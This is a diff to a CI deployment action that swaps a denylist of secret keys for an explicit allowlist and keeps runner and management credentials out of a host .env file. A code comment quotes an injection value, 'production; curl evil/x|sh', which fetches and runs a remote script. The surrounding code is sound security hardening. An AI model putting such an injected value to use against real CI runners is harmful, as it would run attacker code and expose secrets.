@@ -30,6 +30,10 @@ inputs:
   ssh_user:
     description: 'SSH user on the target host'
     required: true
+  secrets_allowlist:
+    description: 'Comma-separated secret keys allowed into the infrastructure host .env'
+    required: false
+    default: 'CLAUDE_ROUTINE_ENDPOINT,CLAUDE_ROUTINE_TOKEN,CLOUDFLARE_TUNNEL_TOKEN,DOMAIN_KUMA,DOMAIN_TRAEFIK,TRAEFIK_DASHBOARD_AUTH'
   secrets_context_json:
     description: 'JSON-serialized secrets context (toJson(secrets)) for generate-env'
     required: true
@@ -143,6 +147,7 @@ runs:
       shell: bash
       env:
         SECRETS_CONTEXT_RAW: ${{ inputs.secrets_context_json }}
+        SECRETS_ALLOWLIST: ${{ inputs.secrets_allowlist }}
         # Via env, NOT a raw ${{ }} expression in the run: body. A raw expression
         # is substituted into the script text BEFORE bash parses it, so a value
         # like "production; curl evil/x|sh" would execute on the runner itself.
@@ -150,14 +155,33 @@ runs:
         TARGET_ENVIRONMENT: ${{ inputs.target_environment }}
       run: |
         set -euo pipefail
-        # S5/S21 partial mitigation: drop CI-only secret families before
-        # generate-env sees them. TS_ added in v2.0.0 (Tailscale OAuth).
-        # S224: also drop CF account-level tokens and TF_CLOUD_TOKEN (exact
-        # match) — neither cloudflared nor Traefik needs them; only
-        # CLOUDFLARE_TUNNEL_TOKEN must stay (cloudflared auth).
-        SECRETS_CONTEXT=$(
-          printf '%s' "$SECRETS_CONTEXT_RAW" \
-            | jq -c 'with_entries(select(.key | test("^(SSH_|B2_|RESTIC_|GITHUB_|TS_)|^(CLOUDFLARE_API_TOKEN|CLOUDFLARE_ACCESS_API_TOKEN|CLOUDFLARE_ACCOUNT_ID|TF_CLOUD_TOKEN)$") | not))'
+        # An explicit allowlist prevents future secrets from silently reaching the host .env;
+        # a denylist would forward every new secret, including the runner App key and
+        # management auth key (S274).
+        SECRETS_CONTEXT=$(python3 - <<'PY'
+        import json
+        import os
+        import sys
+
+        try:
+            raw = json.loads(os.environ["SECRETS_CONTEXT_RAW"])
+        except (json.JSONDecodeError, KeyError) as exc:
+            print(f"Invalid secrets context JSON: {exc}", file=sys.stderr)
+            raise SystemExit(1)
+        if not isinstance(raw, dict):
+            print("Invalid secrets context JSON: expected an object.", file=sys.stderr)
+            raise SystemExit(1)
+
+        allowed = {name.strip() for name in os.environ.get("SECRETS_ALLOWLIST", "").split(",") if name.strip()}
+        # The runner GitHub App credentials and the management tailnet key must never reach a host .env,
+        # whatever a caller puts into secrets_allowlist (S274).
+        protected = {key for key in allowed if key.startswith("GH_RUNNER_") or key == "TAILSCALE_MGMT_AUTH_KEY"}
+        if protected:
+            print("Ignoring protected keys in the allowlist: " + ", ".join(sorted(protected)), file=sys.stderr)
+        filtered = {key: value for key, value in raw.items() if key in allowed and key not in protected}
+        print("Allowed secrets forwarded: " + ", ".join(sorted(filtered)), file=sys.stderr)
+        print(json.dumps(filtered, separators=(",", ":")))
+        PY
         )
         unset SECRETS_CONTEXT_RAW
         export SECRETS_CONTEXT
